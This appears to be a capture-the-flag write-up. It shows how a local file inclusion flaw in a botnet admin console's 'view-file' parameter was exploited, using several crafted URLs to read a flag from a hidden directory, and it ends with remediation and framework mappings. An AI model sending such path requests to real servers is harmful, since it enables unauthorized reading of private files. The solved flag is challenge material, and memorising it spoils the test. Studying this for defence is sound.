# A Bitter Delicacy

| Detail | Value |
|--------|-------|
| **CTF** | Pointer Overflow CTF 2024 |
| **Category** | Steganography |
| **Difficulty** | Expert |
| **Points** | 400 |
| **Flag** | `poctf{uwsp_4ll_w3_h4v3_70_d3c1d3}` |
| **Status** | Solved |

---

## Challenge Overview

A web challenge involving a botnet admin console with a hidden login page and a Local File Inclusion (LFI) vulnerability. The challenge hints at a hidden login, an error log one level above the app, and secrets hidden using "cutting-edge Linux methods" (dotfiles). Exploiting the LFI via the `view-file` parameter to access `.hidden/flag.txt` reveals the flag.

---

## Objective

Discover the hidden login page, identify the LFI vulnerability via error messages, and traverse the file system to read the flag from a hidden directory.

---

## Methodology

### Step 1: Find the hidden login page

The challenge description mentions a hidden login page. Navigating to `/login` reveals a login form for the botnet admin console.

### Step 2: Trigger an error message

Attempting to log in with invalid credentials returns:

```
view-file log/error.log: Err7 - Bad username or password.
Please check your credentials and try again
```

This reveals the `view-file` parameter, suggesting the application reads files based on URL input.

### Step 3: Confirm Local File Inclusion

Testing the `view-file` parameter:

```
http://<host>/view-file?file=log
```

Returns: `Error: [Errno 21] Is a directory: '/log'`

This confirms the parameter reads from the local filesystem.

```
http://<host>/view-file?file=log/error.log
```

Returns the error log content, confirming LFI.

### Step 4: Discover the hidden directory

The challenge mentions secrets hidden using "cutting-edge Linux methods," referencing dotfiles (hidden directories starting with `.`).

Testing:

```
http://<host>/view-file?file=.hidden
```

Returns: `Error: [Errno 21] Is a directory: '/.hidden'`

### Step 5: Read the flag

```
http://<host>/view-file?file=.hidden/flag.txt
```

This returns the flag.

---

## Flag

```
poctf{uwsp_4ll_w3_h4v3_70_d3c1d3}
```

---

## Lessons Learned

| # | Lesson | Detail |
|---|--------|--------|
| 1 | Error messages leak filesystem paths | Directory errors confirm LFI and reveal structure |
| 2 | Challenge descriptions contain hints | "Cutting-edge Linux methods" points to dotfiles |
| 3 | Dotfiles are not truly hidden | `.hidden` directories are trivially accessible via LFI |
| 4 | LFI can arise from error logging | The `view-file` function intended for logs exposes the whole filesystem |

---

## MITRE ATT&CK Mapping

| Tactic          | Technique                          | ID        |
|-----------------|------------------------------------|-----------|
| Initial Access  | Exploit Public-Facing Application  | T1190     |
| Collection      | Data from Local System             | T1005     |
| Discovery       | File and Directory Discovery       | T1083     |

---

## OWASP Top 10 2021 Mapping

| Category | ID    | Relevance |
|----------|-------|-----------|
| Injection | A03:2021 | Local File Inclusion via path traversal |
| Security Misconfiguration | A05:2021 | Verbose filesystem errors, exposed file reader |
| Broken Access Control     | A01:2021 | No authorization check on file access |

---

## Remediation

### Technical Fixes
- Validate and sanitize file path parameters with strict allowlists
- Restrict file reads to a specific directory using chroot or path canonicalization
- Do not expose internal file reading mechanisms to users
- Suppress filesystem error details in production

### OWASP Top 10 2021
- **A03 Injection**: validate file paths against an allowlist; reject paths with `.` or `/`
- **A01 Broken Access Control**: require authentication for file access endpoints
- **A05 Security Misconfiguration**: suppress detailed filesystem errors

### D3FEND Countermeasures
| Technique                  | ID        |
|----------------------------|-----------|
| File Access Pattern Analysis | D3-FAPA |
| Application Hardening      | D3-AH     |

### NIST CSF 2.0
| Function | Category                | Subcategory |
|----------|------------------------|-------------|
| Protect  | Data Security          | PR.DS-01    |
| Protect  | Platform Security      | PR.PS-01    |

### NIST SP 800-53 Rev. 5
| Control     | Description                          |
|-------------|--------------------------------------|
| AC-3        | Access Enforcement                   |
| SI-10       | Information Input Validation         |
| SI-11       | Error Handling                       |

### C2M2
| Practice Area               | MIL |
|-----------------------------|-----|
| Threat and Vulnerability Management | MIL3 |

### CWE
| ID      | Name                                     |
|---------|------------------------------------------|
| CWE-22  | Improper Limitation of a Pathname to a Restricted Directory |
| CWE-209 | Generation of Error Message Containing Sensitive Information |

---

## References

- Based on solve approach from [Jdwalli](https://github.com/Jdwalli/ctf-writeups)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP Top 10 2021](https://owasp.org/Top10/)

---

## Closing

Thanks guys!! (❍ᴥ❍ʋ)

All we have to decide is what to do with the file paths that are given to us. When the server hands you an LFI, the decision is easy: enumerate, traverse, and capture. Always sanitize those paths, folks.

[![Instagram](https://img.shields.io/badge/-Instagram-E4405F?style=flat&logo=instagram&logoColor=white)](https://www.instagram.com/uniaogeek)
[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0077B5?style=flat&logo=linkedin&logoColor=white)](http://linkedin.com/in/mrhenrike)
[![X](https://img.shields.io/badge/-X-000000?style=flat&logo=x&logoColor=white)](https://x.com/mrhenrike)
